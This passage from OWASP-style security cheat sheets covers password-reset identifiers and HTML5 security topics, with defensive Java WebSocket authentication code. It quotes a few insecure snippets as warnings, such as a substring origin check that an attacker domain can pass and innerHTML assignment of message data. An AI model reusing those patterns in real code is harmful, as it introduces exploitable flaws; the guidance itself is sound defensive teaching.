order to allow a user to request a password reset, you will need to have some way to identify the user, or a means to reach out to them through a side-channel.\r\n\r\nThis can be done through any of the following methods:\r\n\r\n- [URL tokens](#url-tokens).\r\n- [PINs](#pins)\r\n- [Offline methods](#offline-methods)\r\n- [Security questions](#security-questions).\r\n\r\nThese methods can be used together to provide a greater degree of assurance that the user is who they claim to be. No matter what, you must ensure that a user always has a way to recover their account, even if that involves contacting the support team and proving their identity to staff.\r\n\r\n### General Security Practices\r\n\r\nIt is essential to employ good security practices for the reset identifiers (tokens, codes, PINs, etc.). Some points don't apply to the [offline methods](#offline-methods), such as the lifetime restriction. All tokens and codes should be:\r\n\r\n- Generated [cryptographically secure random number generator](Cryptographic_Storage_Cheat_Sheet.md#secure-random-number-generation).\r\n    - It is also possible to use JSON Web Tokens (JWTs) in place of random tokens, although this can introduce additional vulnerability, such as those discussed in the [JSON Web Token Cheat Sheet](JSON_Web_Token_for_Java_Cheat_Sheet.md).\r\n- Long enough to protect against brute-force attacks.\r\n- Linked to an individual user in the database.\r\n- Invalidated after they have been used.\r\n- Stored in a secure manner, as discussed in the [Password Storage Cheat Sheet](Password_Storage_Cheat_Sheet.md).\r\n\r\n### URL Tokens\r\n\r\nURL tokens are passed in the query string of the URL, and are typically sent to the user via email. The basic overview of the process is as follows:\r\n\r\n1. Generate a token to the user and attach it in the URL query string.\r\n2. Send this token to the user via email.\r\n   - Don't rely on the [Host](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Host) header while creating the reset URLs to avoid [Host Header Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection) attacks. The URL should be either be hard-coded, or should be validated against a list of trusted domains.\r\n   - Ensure that the URL is using HTTPS.\r\n3. The user receives the email, and browses to the URL with the attached token.\r\n   - Ensure that the reset password page adds the [Referrer Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy) tag with the `noreferrer` value in order to avoid [referrer leakage](https://portswigger.net/kb/issues/00500400_cross-domain-referer-leakage).\r\n   - Implement appropriate protection to prevent users from brute-forcing tokens in the URL, such as rate limiting.\r\n4. If required, perform any additional validation steps such as requiring the user to answer [security questions](#security-questions).\r\n5. Let the user create a new password and confirm it. Ensure that the same password policy used elsewhere in the application is applied.\r\n\r\n*Note:* URL tokens can follow on the same behavior of the [PINs](#pins) by creating a restricted session from the token. Decision should be made based on the needs and the expertise of the developer.\r\n\r\n### PINs\r\n\r\nPINs are numbers (between 6 and 12 digits) that are sent to the user through a side-channel such as SMS.\r\n\r\n1. Generate a PIN.\r\n2. Send it to the user via SMS or another mechanism.\r\n   - Breaking the PIN up with spaces makes it easier for the user to read and enter.\r\n3. The user then enters the PIN along with their username on the password reset page.\r\n4. Create a limited session from that PIN that only permits the user to reset their password.\r\n5. Let the user create a new password and confirm it. Ensure that the same password policy used elsewhere in the application is applied.\r\n\r\n### Offline Methods\r\n\r\nOffline methods differ from other methods by allowing the user to reset their password without requesting a special identifier (such as a token or PIN) from the backend. However, authentication still needs to be conducted by the backend to ensure that the request is legitimate. Offline methods provide a certain identifier either on registration, or when the user wishes to configure it.\r\n\r\nThese identifiers should be stored offline and in a secure fashion (*e.g.* password managers), and the backend should properly follow the [general security practices](#general-security-practices). Some implementations are built on [hardware OTP tokens](Multifactor_Authentication_Cheat_Sheet.md#hardware-otp-tokens), [certificates](Multifactor_Authentication_Cheat_Sheet.md#certificates), or any other implementation that could be used inside of an enterprise. These are out of scope for this cheat sheet.\r\n\r\n#### Backup Codes\r\n\r\nBackup codes should be provided to the user upon registering where the user should store them offline in a secure place (such as their password manager). Some companies that implement this method are [Google](https://support.google.com/accounts/answer/1187538), [GitHub](https://help.github.com/en/github/authenticating-to-github/recovering-your-account-if-you-lose-your-2fa-credentials), and [Auth0](https://auth0.com/docs/mfa/guides/reset-user-mfa#recovery-codes).\r\n\r\nWhile implementing this method, the following practices should be followed:\r\n\r\n- Minimum length of 8 digits, 12 for improved security.\r\n- A user should have multiple recovery codes at any given time to ensure that one of them works (most services provide the user with ten backup codes).\r\n- A process should be implemented to allow the user to invalidate all existing recovery codes, in case they are compromised by a third party.\r\n- Rate limiting and other protections should be implemented to prevent an attacker from brute-forcing the backup codes.\r\n\r\n### Security Questions\r\n\r\nSecurity questions should not be used as the sole mechanism for resetting passwords due to their answers frequently being easily guessable or obtainable by attackers. However, they can provide an additional layer of security when combined with the other methods discussed in this cheat sheet. If they are used, then ensure that secure questions are chosen as discussed in the [Security Questions cheat sheet](Choosing_and_Using_Security_Questions_Cheat_Sheet.md).\r\n\r\n## Account Lockout\r\n\r\nAccounts should not be locked out in response to a forgotten password attack, as this can be used to deny access to users with known usernames. For more details on account lockouts, see the [Authentication Cheat Sheet](Authentication_Cheat_Sheet.md).\r\n"
    },
    {
      "HTML5_Security_Cheat_Sheet.md": "# HTML5 Security Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThe following cheat sheet serves as a guide for implementing HTML 5 in a secure fashion.\r\n\r\n## Communication APIs\r\n\r\n### Web Messaging\r\n\r\nWeb Messaging (also known as Cross Domain Messaging) provides a means of messaging between documents from different origins in a way that is generally safer than the multiple hacks used in the past to accomplish this task. However, there are still some recommendations to keep in mind:\r\n\r\n- When posting a message, explicitly state the expected origin as the second argument to `postMessage` rather than `*` in order to prevent sending the message to an unknown origin after a redirect or some other means of the target window's origin changing.\r\n- The receiving page should **always**:\r\n    - Check the `origin` attribute of the sender to verify the data is originating from the expected location.\r\n    - Perform input validation on the `data` attribute of the event to ensure that it's in the desired format.\r\n- Don't assume you have control over the `data` attribute. A single [Cross Site Scripting](Cross_Site_Scripting_Prevention_Cheat_Sheet.md) flaw in the sending page allows an attacker to send messages of any given format.\r\n- Both pages should only interpret the exchanged messages as **data**. Never evaluate passed messages as code (e.g. via `eval()`) or insert it to a page DOM (e.g. via `innerHTML`), as that would create a DOM-based XSS vulnerability. For more information see [DOM based XSS Prevention Cheat Sheet](DOM_based_XSS_Prevention_Cheat_Sheet.md).\r\n- To assign the data value to an element, instead of using a insecure method like `element.innerHTML=data;`, use the safer option: `element.textContent=data;`\r\n- Check the origin properly exactly to match the FQDN(s) you expect. Note that the following code: `if(message.origin.indexOf(\".owasp.org\")!=-1) { /* ... */ }` is very insecure and will not have the desired behavior as `owasp.org.attacker.com` will match.\r\n- If you need to embed external content/untrusted gadgets and allow user-controlled scripts (which is highly discouraged), please check the information on [sandboxed frames](HTML5_Security_Cheat_Sheet.md#sandboxed-frames).\r\n\r\n### Cross Origin Resource Sharing\r\n\r\n- Validate URLs passed to `XMLHttpRequest.open`. Current browsers allow these URLs to be cross domain; this behavior can lead to code injection by a remote attacker. Pay extra attention to absolute URLs.\r\n- Ensure that URLs responding with `Access-Control-Allow-Origin: *` do not include any sensitive content or information that might aid attacker in further attacks. Use the `Access-Control-Allow-Origin` header only on chosen URLs that need to be accessed cross-domain. Don't use the header for the whole domain.\r\n- Allow only selected, trusted domains in the `Access-Control-Allow-Origin` header. Prefer allowing specific domains over blocking or allowing any domain (do not use `*` wildcard nor blindly return the `Origin` header content without any checks).\r\n- Keep in mind that CORS does not prevent the requested data from going to an unauthorized location. It's still important for the server to perform usual [CSRF](Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md) prevention.\r\n- While the [Fetch Standard](https://fetch.spec.whatwg.org/#http-cors-protocol) recommends a pre-flight request with the `OPTIONS` verb, current implementations might not perform this request, so it's important that \"ordinary\" (`GET` and `POST`) requests perform any access control necessary.\r\n- Discard requests received over plain HTTP with HTTPS origins to prevent mixed content bugs.\r\n- Don't rely only on the Origin header for Access Control checks. Browser always sends this header in CORS requests, but may be spoofed outside the browser. Application-level protocols should be used to protect sensitive data.\r\n\r\n### WebSockets\r\n\r\n- Drop backward compatibility in implemented client/servers and use only protocol versions above hybi-00. Popular Hixie-76 version (hiby-00) and older are outdated and insecure.\r\n- The recommended version supported in latest versions of all current browsers is [RFC 6455](http://tools.ietf.org/html/rfc6455) (supported by Firefox 11+, Chrome 16+, Safari 6, Opera 12.50, and IE10).\r\n- While it's relatively easy to tunnel TCP services through WebSockets (e.g. VNC, FTP), doing so enables access to these tunneled services for the in-browser attacker in case of a Cross Site Scripting attack. These services might also be called directly from a malicious page or program.\r\n- The protocol doesn't handle authorization and/or authentication. Application-level protocols should handle that separately in case sensitive data is being transferred.\r\n- Process the messages received by the websocket as data. Don't try to assign it directly to the DOM nor evaluate as code. If the response is JSON, never use the insecure `eval()` function; use the safe option JSON.parse() instead.\r\n- Endpoints exposed through the `ws://` protocol are easily reversible to plain text. Only `wss://` (WebSockets over SSL/TLS) should be used for protection against Man-In-The-Middle attacks.\r\n- Spoofing the client is possible outside a browser, so the WebSockets server should be able to handle incorrect/malicious input. Always validate input coming from the remote site, as it might have been altered.\r\n- When implementing servers, check the `Origin:` header in the Websockets handshake. Though it might be spoofed outside a browser, browsers always add the Origin of the page that initiated the Websockets connection.\r\n- As a WebSockets client in a browser is accessible through JavaScript calls, all Websockets communication can be spoofed or hijacked through [Cross Site Scripting](https://owasp.org/www-community/attacks/xss/). Always validate data coming through a WebSockets connection.\r\n\r\n### Server-Sent Events\r\n\r\n- Validate URLs passed to the `EventSource` constructor, even though only same-origin URLs are allowed.\r\n- As mentioned before, process the messages (`event.data`) as data and never evaluate the content as HTML or script code.\r\n- Always check the origin attribute of the message (`event.origin`) to ensure the message is coming from a trusted domain. Use an allow-list approach.\r\n\r\n## Storage APIs\r\n\r\n### Local Storage\r\n\r\n- Also known as Offline Storage, Web Storage. Underlying storage mechanism may vary from one user agent to the next. In other words, any authentication your application requires can be bypassed by a user with local privileges to the machine on which the data is stored. Therefore, it's recommended to avoid storing any sensitive information in local storage where authentication would be assumed.\r\n- Due to the browser's security guarantees it is appropriate to use local storage where access to the data is not assuming authentication or authorization.\r\n- Use the object sessionStorage instead of localStorage if persistent storage is not needed. sessionStorage object is available only to that window/tab until the window is closed.\r\n- A single [Cross Site Scripting](https://owasp.org/www-community/attacks/xss/) can be used to steal all the data in these objects, so again it's recommended not to store sensitive information in local storage.\r\n- A single [Cross Site Scripting](https://owasp.org/www-community/attacks/xss/) can be used to load malicious data into these objects too, so don't consider objects in these to be trusted.\r\n- Pay extra attention to \"localStorage.getItem\" and \"setItem\" calls implemented in HTML5 page. It helps in detecting when developers build solutions that put sensitive information in local storage, which can be a severe risk if authentication or authorization to that data is incorrectly assumed.\r\n- Do not store session identifiers in local storage as the data is always accessible by JavaScript. Cookies can mitigate this risk using the `httpOnly` flag.\r\n- There is no way to restrict the visibility of an object to a specific path like with the attribute path of HTTP Cookies, every object is shared within an origin and protected with the Same Origin Policy. Avoid hosting multiple applications on the same origin, all of them would share the same localStorage object, use different subdomains instead.\r\n\r\n### Client-side databases\r\n\r\n- On November 2010, the W3C announced Web SQL Database (relational SQL database) as a deprecated specification. A new standard Indexed Database API or IndexedDB (formerly WebSimpleDB) is actively developed, which provides key-value database storage and methods for performing advanced queries.\r\n- Underlying storage mechanisms may vary from one user agent to the next. In other words, any authentication your application requires can be bypassed by a user with local privileges to the machine on which the data is stored. Therefore, it's recommended not to store any sensitive information in local storage.\r\n- If utilized, WebDatabase content on the client side can be vulnerable to SQL injection and needs to have proper validation and parameterization.\r\n- Like Local Storage, a single [Cross Site Scripting](https://owasp.org/www-community/attacks/xss/) can be used to load malicious data into a web database as well. Don't consider data in these to be trusted.\r\n\r\n## Geolocation\r\n\r\n- The [Geolocation API](https://www.w3.org/TR/2021/WD-geolocation-20211124/#security) requires that user agents ask for the user's permission before calculating location. Whether or how this decision is remembered varies from browser to browser. Some user agents require the user to visit the page again in order to turn off the ability to get the user's location without asking, so for privacy reasons, it's recommended to require user input before calling `getCurrentPosition` or `watchPosition`.\r\n\r\n## Web Workers\r\n\r\n- Web Workers are allowed to use `XMLHttpRequest` object to perform in-domain and Cross Origin Resource Sharing requests. See relevant section of this Cheat Sheet to ensure CORS security.\r\n- While Web Workers don't have access to DOM of the calling page, malicious Web Workers can use excessive CPU for computation, leading to Denial of Service condition or abuse Cross Origin Resource Sharing for further exploitation. Ensure code in all Web Workers scripts is not malevolent. Don't allow creating Web Worker scripts from user supplied input.\r\n- Validate messages exchanged with a Web Worker. Do not try to exchange snippets of JavaScript for evaluation e.g. via `eval()` as that could introduce a [DOM Based XSS](DOM_based_XSS_Prevention_Cheat_Sheet.md) vulnerability.\r\n\r\n## Tabnabbing\r\n\r\nAttack is described in detail in this [article](https://owasp.org/www-community/attacks/Reverse_Tabnabbing).\r\n\r\nTo summarize, it's the capacity to act on parent page's content or location from a newly opened page via the back link exposed by the **opener** JavaScript object instance.\r\n\r\nIt applies to an HTML link or a JavaScript `window.open` function using the attribute/instruction `target` to specify a [target loading location](https://www.w3schools.com/tags/att_a_target.asp) that does not replace the current location and then makes the current window/tab available.\r\n\r\nTo prevent this issue, the following actions are available:\r\n\r\nCut the back link between the parent and the child pages:\r\n\r\n- For HTML links:\r\n    - To cut this back link, add the attribute `rel=\"noopener\"` on the tag used to create the link from the parent page to the child page. This attribute value cuts the link, but depending on the browser, lets referrer information be present in the request to the child page.\r\n    - To also remove the referrer information use this attribute value: `rel=\"noopener noreferrer\"`.\r\n- For the JavaScript `window.open` function, add the values `noopener,noreferrer` in the [windowFeatures](https://developer.mozilla.org/en-US/docs/Web/API/Window/open) parameter of the `window.open` function.\r\n\r\nAs the behavior using the elements above is different between the browsers, either use an HTML link or JavaScript to open a window (or tab), then use this configuration to maximize the cross supports:\r\n\r\n- For [HTML links](https://www.scaler.com/topics/html/html-links/), add the attribute `rel=\"noopener noreferrer\"` to every link.\r\n- For JavaScript, use this function to open a window (or tab):\r\n\r\n``` javascript\r\nfunction openPopup(url, name, windowFeatures){\r\n  //Open the popup and set the opener and referrer policy instruction\r\n  var newWindow = window.open(url, name, 'noopener,noreferrer,' + windowFeatures);\r\n  //Reset the opener link\r\n  newWindow.opener = null;\r\n}\r\n```\r\n\r\n- Add the HTTP response header `Referrer-Policy: no-referrer` to every HTTP response sent by the application ([Header Referrer-Policy information](https://owasp.org/www-project-secure-headers/). This configuration will ensure that no referrer information is sent along with requests from the page.\r\n\r\nCompatibility matrix:\r\n\r\n- [noopener](https://caniuse.com/#search=noopener)\r\n- [noreferrer](https://caniuse.com/#search=noreferrer)\r\n- [referrer-policy](https://caniuse.com/#feat=referrer-policy)\r\n\r\n## Sandboxed frames\r\n\r\n- Use the `sandbox` attribute of an `iframe` for untrusted content.\r\n- The `sandbox` attribute of an `iframe` enables restrictions on content within an `iframe`. The following restrictions are active when the `sandbox` attribute is set:\r\n    1. All markup is treated as being from a unique origin.\r\n    2. All forms and scripts are disabled.\r\n    3. All links are prevented from targeting other browsing contexts.\r\n    4. All features that trigger automatically are blocked.\r\n    5. All plugins are disabled.\r\n\r\nIt is possible to have a [fine-grained control](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox) over `iframe` capabilities using the value of the `sandbox` attribute.\r\n\r\n- In old versions of user agents where this feature is not supported, this attribute will be ignored. Use this feature as an additional layer of protection or check if the browser supports sandboxed frames and only show the untrusted content if supported.\r\n- Apart from this attribute, to prevent Clickjacking attacks and unsolicited framing it is encouraged to use the header `X-Frame-Options` which supports the `deny` and `same-origin` values. Other solutions like framebusting `if(window!==window.top) { window.top.location=location;}` are not recommended.\r\n\r\n## Credential and Personally Identifiable Information (PII) Input hints\r\n\r\n- Protect the input values from being cached by the browser.\r\n\r\n> Access a financial account from a public computer. Even though one is logged-off, the next person who uses the machine can log-in because the browser autocomplete functionality. To mitigate this, we tell the input fields not to assist in any way.\r\n\r\n```html\r\n<input type=\"text\" spellcheck=\"false\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\"></input>\r\n```\r\n\r\nText areas and input fields for PII (name, email, address, phone number) and login credentials (username, password) should be prevented from being stored in the browser. Use these HTML5 attributes to prevent the browser from storing PII from your form:\r\n\r\n- `spellcheck=\"false\"`\r\n- `autocomplete=\"off\"`\r\n- `autocorrect=\"off\"`\r\n- `autocapitalize=\"off\"`\r\n\r\n## Offline Applications\r\n\r\n- Whether the user agent requests permission from the user to store data for offline browsing and when this cache is deleted, varies from one browser to the next. Cache poisoning is an issue if a user connects through insecure networks, so for privacy reasons it is encouraged to require user input before sending any `manifest` file.\r\n- Users should only cache trusted websites and clean the cache after browsing through open or insecure networks.\r\n\r\n## Progressive Enhancements and Graceful Degradation Risks\r\n\r\n- The best practice now is to determine the capabilities that a browser supports and augment with some type of substitute for capabilities that are not directly supported. This may mean an onion-like element, e.g. falling through to a Flash Player if the `<video>` tag is unsupported, or it may mean additional scripting code from various sources that should be code reviewed.\r\n\r\n## HTTP Headers to enhance security\r\n\r\nConsult the project [OWASP Secure Headers](https://owasp.org/www-project-secure-headers/) in order to obtains the list of HTTP security headers that an application should use to enable defenses at browser level.\r\n\r\n## WebSocket implementation hints\r\n\r\nIn addition to the elements mentioned above, this is the list of areas for which caution must be taken during the implementation.\r\n\r\n- Access filtering through the \"Origin\" HTTP request header\r\n- Input / Output validation\r\n- Authentication\r\n- Authorization\r\n- Access token explicit invalidation\r\n- Confidentiality and Integrity\r\n\r\nThe section below will propose some implementation hints for every area and will go along with an application example showing all the points described.\r\n\r\nThe complete source code of the example application is available [here](https://github.com/righettod/poc-websocket).\r\n\r\n### Access filtering\r\n\r\nDuring a websocket channel initiation, the browser sends the **Origin** HTTP request header that contains the source domain initiation for the request to handshake. Even if this header can be spoofed in a forged HTTP request (not browser based), it cannot be overridden or forced in a browser context. It then represents a good candidate to apply filtering according to an expected value.\r\n\r\nAn example of an attack using this vector, named *Cross-Site WebSocket Hijacking (CSWSH)*, is described [here](https://www.christian-schneider.net/CrossSiteWebSocketHijacking.html).\r\n\r\nThe code below defines a configuration that applies filtering based on an \"allow list\" of origins. This ensures that only allowed origins can establish a full handshake:\r\n\r\n``` java\r\nimport org.owasp.encoder.Encode;\r\nimport org.slf4j.Logger;\r\nimport org.slf4j.LoggerFactory;\r\n\r\nimport javax.websocket.server.ServerEndpointConfig;\r\nimport java.util.Arrays;\r\nimport java.util.List;\r\n\r\n/**\r\n * Setup handshake rules applied to all WebSocket endpoints of the application.\r\n * Use to setup the Access Filtering using \"Origin\" HTTP header as input information.\r\n *\r\n * @see \"http://docs.oracle.com/javaee/7/api/index.html?javax/websocket/server/\r\n * ServerEndpointConfig.Configurator.html\"\r\n * @see \"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin\"\r\n */\r\npublic class EndpointConfigurator extends ServerEndpointConfig.Configurator {\r\n\r\n    /**\r\n     * Logger\r\n     */\r\n    private static final Logger LOG = LoggerFactory.getLogger(EndpointConfigurator.class);\r\n\r\n    /**\r\n     * Get the expected source origins from a JVM property in order to allow external configuration\r\n     */\r\n    private static final List<String> EXPECTED_ORIGINS =  Arrays.asList(System.getProperty(\"source.origins\")\r\n                                                          .split(\";\"));\r\n\r\n    /**\r\n     * {@inheritDoc}\r\n     */\r\n    @Override\r\n    public boolean checkOrigin(String originHeaderValue) {\r\n        boolean isAllowed = EXPECTED_ORIGINS.contains(originHeaderValue);\r\n        String safeOriginValue = Encode.forHtmlContent(originHeaderValue);\r\n        if (isAllowed) {\r\n            LOG.info(\"[EndpointConfigurator] New handshake request received from {} and was accepted.\",\r\n                      safeOriginValue);\r\n        } else {\r\n            LOG.warn(\"[EndpointConfigurator] New handshake request received from {} and was rejected !\",\r\n                      safeOriginValue);\r\n        }\r\n        return isAllowed;\r\n    }\r\n\r\n}\r\n```\r\n\r\n### Authentication and Input/Output validation\r\n\r\nWhen using websocket as communication channel, it's important to use an authentication method allowing the user to receive an access *Token* that is not automatically sent by the browser and then must be explicitly sent by the client code during each exchange.\r\n\r\nHMAC digests are the simplest method, and [JSON Web Token](https://jwt.io/introduction/) is a good feature rich alternative, because it allows the transport of access ticket information in a stateless and not alterable way. Moreover, it defines a validity timeframe. You can find additional information about JWT token hardening on this [cheat sheet](JSON_Web_Token_for_Java_Cheat_Sheet.md).\r\n\r\n[JSON Validation Schema](http://json-schema.org/) are used to define and validate the expected content in input and output messages.\r\n\r\nThe code below defines the complete authentication messages flow handling:\r\n\r\n**Authentication Web Socket endpoint** - Provide a WS endpoint that enables authentication exchange\r\n\r\n``` java\r\nimport org.owasp.pocwebsocket.configurator.EndpointConfigurator;\r\nimport org.owasp.pocwebsocket.decoder.AuthenticationRequestDecoder;\r\nimport org.owasp.pocwebsocket.encoder.AuthenticationResponseEncoder;\r\nimport org.owasp.pocwebsocket.handler.AuthenticationMessageHandler;\r\nimport org.slf4j.Logger;\r\nimport org.slf4j.LoggerFactory;\r\n\r\nimport javax.websocket.CloseReason;\r\nimport javax.websocket.OnClose;\r\nimport javax.websocket.OnError;\r\nimport javax.websocket.OnOpen;\r\nimport javax.websocket.Session;\r\nimport javax.websocket.server.ServerEndpoint;\r\n\r\n/**\r\n * Class in charge of managing the client authentication.\r\n *\r\n * @see \"http://docs.oracle.com/javaee/7/api/javax/websocket/server/ServerEndpointConfig.Configurator.html\"\r\n * @see \"http://svn.apache.org/viewvc/tomcat/trunk/webapps/examples/WEB-INF/classes/websocket/\"\r\n */\r\n@ServerEndpoint(value = \"/auth\", configurator = EndpointConfigurator.class,\r\nsubprotocols = {\"authentication\"}, encoders = {AuthenticationResponseEncoder.class},\r\ndecoders = {AuthenticationRequestDecoder.class})\r\npublic class AuthenticationEndpoint {\r\n\r\n    /**\r\n     * Logger\r\n     */\r\n    private static final Logger LOG = LoggerFactory.getLogger(AuthenticationEndpoint.class);\r\n\r\n    /**\r\n     * Handle the beginning of an exchange\r\n     *\r\n     * @param session Exchange session information\r\n     */\r\n    @OnOpen\r\n    public void start(Session session) {\r\n        //Define connection idle timeout and message limits in order to mitigate as much as possible\r\n        //DOS attacks using massive connection opening or massive big messages sending\r\n        int msgMaxSize = 1024 * 1024;//1 MB\r\n        session.setMaxIdleTimeout(60000);//1 minute\r\n        session.setMaxTextMessageBufferSize(msgMaxSize);\r\n        session.setMaxBinaryMessageBufferSize(msgMaxSize);\r\n        //Log exchange start\r\n        LOG.info(\"[AuthenticationEndpoint] Session {} started\", session.getId());\r\n        //Affect a new message handler instance in order to process the exchange\r\n        session.addMessageHandler(new AuthenticationMessageHandler(session.getBasicRemote()));\r\n        LOG.info(\"[AuthenticationEndpoint] Session {} message handler affected for processing\",\r\n                  session.getId());\r\n    }\r\n\r\n    /**\r\n     * Handle error case\r\n     *\r\n     * @param session Exchange session information\r\n     * @param thr     Error details\r\n     */\r\n    @OnError\r\n    public void onError(Session session, Throwable thr) {\r\n        LOG.error(\"[AuthenticationEndpoint] Error occur in session {}\", session.getId(), thr);\r\n    }\r\n\r\n    /**\r\n     * Handle close event\r\n     *\r\n     * @param session     Exchange session information\r\n     * @param closeReason Exchange closing reason\r\n     */\r\n    @OnClose\r\n    public void onClose(Session session, CloseReason closeReason) {\r\n        LOG.info(\"[AuthenticationEndpoint] Session {} closed: {}\", session.getId(),\r\n                  closeReason.getReasonPhrase());\r\n    }\r\n\r\n}\r\n```\r\n\r\n**Authentication message handler** - Handle all authentication requests\r\n\r\n``` java\r\nimport org.owasp.pocwebsocket.enumeration.AccessLevel;\r\nimport org.owasp.pocwebsocket.util.AuthenticationUtils;\r\nimport org.owasp.pocwebsocket.vo.AuthenticationRequest;\r\nimport org.owasp.pocwebsocket.vo.AuthenticationResponse;\r\nimport org.owasp.encoder.Encode;\r\nimport org.slf4j.Logger;\r\nimport org.slf4j.LoggerFactory;\r\n\r\nimport javax.websocket.EncodeException;\r\nimport javax.websocket.MessageHandler;\r\nimport javax.websocket.RemoteEndpoint;\r\nimport java.io.IOException;\r\n\r\n/**\r\n * Handle authentication message flow\r\n */\r\npublic class AuthenticationMessageHandler implements MessageHandler.Whole<AuthenticationRequest> {\r\n\r\n    private static final Logger LOG = LoggerFactory.getLogger(AuthenticationMessageHandler.class);\r\n\r\n    /**\r\n     * Reference to the communication channel with the client\r\n     */\r\n    private RemoteEndpoint.Basic clientConnection;\r\n\r\n    /**\r\n     * Constructor\r\n     *\r\n     * @param clientConnection Reference to the communication channel with the client\r\n     */\r\n    public AuthenticationMessageHandler(RemoteEndpoint.Basic clientConnection) {\r\n        this.clientConnection = clientConnection;\r\n    }\r\n\r\n\r\n    /**\r\n     * {@inheritDoc}\r\n     */\r\n    @Override\r\n    public void onMessage(AuthenticationRequest message) {\r\n        AuthenticationResponse response = null;\r\n        try {\r\n            //Authenticate\r\n            String authenticationToken = \"\";\r\n            String accessLevel = this.authenticate(message.getLogin(), message.getPassword());\r\n            if (accessLevel != null) {\r\n                //Create a simple JSON token representing the authentication profile\r\n                authenticationToken = AuthenticationUtils.issueToken(message.getLogin(), accessLevel);\r\n            }\r\n            //Build the response object\r\n            String safeLoginValue = Encode.forHtmlContent(message.getLogin());\r\n            if (!authenticationToken.isEmpty()) {\r\n                response = new AuthenticationResponse(true, authenticationToken, \"Authentication succeed !\");\r\n                LOG.info(\"[AuthenticationMessageHandler] User {} authentication succeed.\", safeLoginValue);\r\n            } else {\r\n                response = new AuthenticationResponse(false, authenticationToken, \"Authentication failed !\");\r\n                LOG.warn(\"[AuthenticationMessageHandler] User {} authentication failed.\", safeLoginValue);\r\n            }\r\n        } catch (Exception e) {\r\n            LOG.error(\"[AuthenticationMessageHandler] Error occur in authentication process.\", e);\r\n            //Build the response object indicating that authentication fail\r\n            response = new AuthenticationResponse(false, \"\", \"Authentication failed !\");\r\n        } finally {\r\n            //Send response\r\n            try {\r\n                this.clientConnection.sendObject(response);\r\n            } catch (IOException | EncodeException e) {\r\n                LOG.error(\"[AuthenticationMessageHandler] Error occur in response object sending.\", e);\r\n            }\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Authenticate the user\r\n     *\r\n     * @param login    User login\r\n     * @param password User password\r\n     * @return The access level if the authentication succeed or NULL if the authentication failed\r\n     */\r\n    private String authenticate(String login, String password) {\r\n      ....\r\n    }\r\n}\r\n```\r\n\r\n**Utility class to manage JWT token** - Handle the issuing and the validation of the access token. Simple JWT token has been used for the example (focus was made here on the global WS endpoint implementation) here without extra hardening (see this [cheat sheet](JSON_Web_Token_for_Java_Cheat_Sheet.md) to apply extra hardening on the JWT token)\r\n\r\n``` java\r\nimport com.auth0.jwt.JWT;\r\nimport com.auth0.jwt.JWTVerifier;\r\nimport com.auth0.jwt.algorithms.Algorithm;\r\nimport com.auth0.jwt.interfaces.DecodedJWT;\r\n\r\nimport java.io.IOException;\r\nimport java.nio.file.Files;\r\nimport java.nio.file.Paths;\r\nimport java.util.Calendar;\r\nimport java.util.Locale;\r\n\r\n/**\r\n * Utility class to manage the authentication JWT token\r\n */\r\npublic class AuthenticationUtils {\r\n\r\n    /**\r\n     * Build a JWT token for a user\r\n     *\r\n     * @param login       User login\r\n     * @param accessLevel Access level of the user\r\n     * @return The Base64 encoded JWT token\r\n     * @throws Exception If any error occur during the issuing\r\n     */\r\n    public static String issueToken(String login, String accessLevel) throws Exception {\r\n        //Issue a JWT token with validity of 30 minutes\r\n        Algorithm algorithm = Algorithm.HMAC256(loadSecret());\r\n        Calendar c = Calendar.getInstance();\r\n        c.add(Calendar.MINUTE, 30);\r\n        return JWT.create().withIssuer(\"WEBSOCKET-SERVER\").withSubject(login).withExpiresAt(c.getTime())\r\n                  .withClaim(\"access_level\", accessLevel.trim().toUpperCase(Locale.US)).sign(algorithm);\r\n    }\r\n\r\n    /**\r\n     * Verify the validity of the provided JWT token\r\n     *\r\n     * @param token JWT token encoded to verify\r\n     * @return The verified and decoded token with user authentication and\r\n     * authorization (access level) information\r\n     * @throws Exception If any error occur during the token validation\r\n     */\r\n    public static DecodedJWT validateToken(String token) throws Exception {\r\n        Algorithm algorithm = Algorithm.HMAC256(loadSecret());\r\n        JWTVerifier verifier = JWT.require(algorithm).withIssuer(\"WEBSOCKET-SERVER\").build();\r\n        return verifier.verify(token);\r\n    }\r\n\r\n    /**\r\n     * Load the JWT secret used to sign token using a byte array for secret storage in order\r\n     * to avoid persistent string in memory\r\n     *\r\n     * @return The secret as byte array\r\n     * @throws IOException If any error occur during the secret loading\r\n     */\r\n    private static byte[] loadSecret() throws IOException {\r\n        return Files.readAllBytes(Paths.get(\"src\", \"main\", \"resources\", \"jwt-secret.txt\"));\r\n    }\r\n}\r\n```\r\n\r\n**JSON schema of the input and output authentication message** - Define the expected structure of the input and output messages from the authentication endpoint point of view\r\n\r\n```json\r\n{\r\n    \"$schema\": \"http://json-schema.org/schema#\",\r\n    \"title\": \"AuthenticationRequest\",\r\n    \"type\": \"object\",\r\n    \"properties\": {\r\n    \"login\": {\r\n        \"type\": \"string\",\r\n        \"pattern\": \"^[a-zA-Z]{1,10}$\"\r\n    },\r\n    \"password\": {\r\n        \"type\": \"string\"\r\n    }\r\n    },\r\n    \"required\": [\r\n    \"login\",\r\n    \"password\"\r\n    ]\r\n}\r\n\r\n{\r\n\"$schema\": \"http://json-schema.org/schema#\",\r\n\"title\": \"AuthenticationResponse\",\r\n\"type\": \"object\",\r\n\"properties\": {\r\n    \"isSuccess;\": {\r\n    \"type\": \"boolean\"\r\n    },\r\n    \"token\": {\r\n    \"type\": \"string\",\r\n    \"pattern\": \"^[a-zA-Z0-9+/=\\\\._-]{0,500}$\"\r\n    },\r\n    \"message\": {\r\n    \"type\": \"string\",\r\n    \"pattern\": \"^[a-zA-Z0-9!\\\\s]{0,100}$\"\r\n    }\r\n},\r\n\"required\": [\r\n    \"isSuccess\",\r\n    \"token\",\r\n    \"message\"\r\n]\r\n}\r\n```\r\n\r\n**Authentication message decoder and encoder** - Perform the JSON serialization/deserialization and the input/output validation using dedicated JSON Schema. It makes it possible to systematically ensure that all messages received and sent by the 